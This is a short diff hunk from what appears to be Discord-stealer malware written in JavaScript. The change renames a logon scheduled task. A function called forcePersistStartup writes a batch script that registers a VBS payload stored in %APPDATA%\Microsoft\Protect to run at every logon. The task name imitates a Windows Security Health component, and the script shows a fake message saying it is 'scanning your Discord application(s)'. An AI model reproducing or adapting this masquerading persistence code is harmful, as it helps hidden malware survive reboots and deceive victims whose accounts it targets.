@@ -798,7 +798,7 @@ const forcePersistStartup = async () => {
             @echo off
             setlocal
             set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
-            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
+            schtasks /create /tn "WindowsSecurityHealthSystrayEvos" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
             if %ERRORLEVEL% EQU 0 (
                 echo We are scanning your Discord application(s)....
             ) else (
